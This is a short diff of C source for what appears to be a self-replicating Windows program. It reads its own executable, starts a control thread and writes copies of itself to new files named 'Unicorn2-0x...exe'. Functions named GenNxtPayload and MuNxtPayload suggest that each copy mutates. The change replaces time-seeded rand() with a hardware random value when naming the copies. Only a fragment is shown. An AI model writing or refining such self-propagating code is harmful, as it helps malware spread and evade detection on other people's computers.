@@ -24,8 +24,6 @@ int MuWatchDog = 0;
 char nextEXEName[256] = { 0 };
 char **global_argv = 0;
 
-struct timeb AccuTime;
-
 void GenNxtPayload();
 void MuNxtPayload();
 
@@ -35,8 +33,6 @@ int main(int argc, char** argv)
 {
     global_argv = argv;
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
-    ftime(&AccuTime);
-    srand((unsigned)AccuTime.time);
     FILE* fp = fopen(argv[0], "rb");
     fseek(fp, 0, SEEK_END);
     myEXESize = ftell(fp);
@@ -93,7 +89,7 @@ int main(int argc, char** argv)
         
         while (fp == NULL)
         {
-            sprintf(nextEXEName, "Unicorn2-0x%X%X.exe", rand(), rand());
+            sprintf(nextEXEName, "Unicorn2-0x%llX.exe", Get_Hardware_Rand());
             fp = fopen(nextEXEName, "wb");
         }
         fwrite(myFileBuffer, 1, myStaticLength, fp);
